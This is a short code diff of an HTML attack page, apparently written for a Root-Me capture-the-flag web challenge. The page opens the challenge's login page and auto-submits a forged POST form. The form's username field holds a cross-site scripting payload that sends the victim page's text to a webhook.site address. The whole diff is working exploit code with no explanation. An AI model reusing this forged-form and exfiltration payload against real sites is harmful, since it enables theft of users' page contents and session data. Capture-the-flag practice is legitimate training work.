@@ -1,11 +1,12 @@
+
+<form id=f method=POST action="http://challenge01.root-me.org:58003/login" target="_self">
+  <input name=username value="<script>new Image().src=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.body.innerText}`</script>">
+</form>
+
 <script>
 window.open('http://challenge01.root-me.org:58003/login','loginP');
 setTimeout(function(){
-  var f=document.createElement('form');
-  f.method='POST';
-  f.action='http://challenge01.root-me.org:58003/login';
-  f.innerHTML='<input name="username" value="<script>new Image().src=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.body.innerText}`</script>">';
-  document.body.appendChild(f);
+  var f=document.getElementById('f');
   f.submit();
 },3000);
 </script>
